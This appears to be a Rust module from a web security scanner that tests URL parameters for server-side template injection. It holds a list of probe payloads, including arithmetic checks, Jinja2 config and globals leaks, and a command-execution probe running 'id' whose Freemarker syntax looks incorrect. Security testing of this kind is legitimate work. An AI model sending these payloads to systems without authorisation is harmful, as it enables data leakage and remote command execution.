use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// SSTI detection via mathematical expression evaluation
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Server Side Template Injection (SSTI)", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for SSTI testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;

    // (payload, expected_result, engine_hint)
    let probes: Vec<(&str, &str, &str)> = vec![
        ("{{1337*2}}", "2674", "Jinja2/Twig/Unknown"),
        ("${1337*2}", "2674", "Java EL/Freemarker"),
        ("#{1337*2}", "2674", "Ruby ERB/Java"),
        ("<%= 1337*2 %>", "2674", "ERB/JSP"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("{{7*'7'}}", "49", "Twig"),
        ("${\"freemarker\".exec(\"id\")}", "uid=", "Freemarker RCE"),
        ("{{config}}", "<Config", "Jinja2 (Flask config leak)"),
        ("{{self.__init__.__globals__}}", "os", "Jinja2 (globals leak)"),
    ];

    for (param_name, _) in &params {
        for (payload, expected, engine) in &probes {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            let result = Analyzer::send_and_analyze(&client, &url, expected).await?;

            if result.reflected_in_body {
                // Confirm it's not just reflecting the raw payload
                if !result.response_body.contains(payload) || payload.contains(expected) == false {
                    println!(
                        "{} CONFIRMED: SSTI in param '{}' — Engine: {}",
                        "[!]".red().bold(), param_name, engine
                    );
                    println!("    Payload: {}", payload);
                    println!("    Expected '{}' found in response", expected);
                    return Ok(());
                }
            }
        }
    }

    Ok(())
}
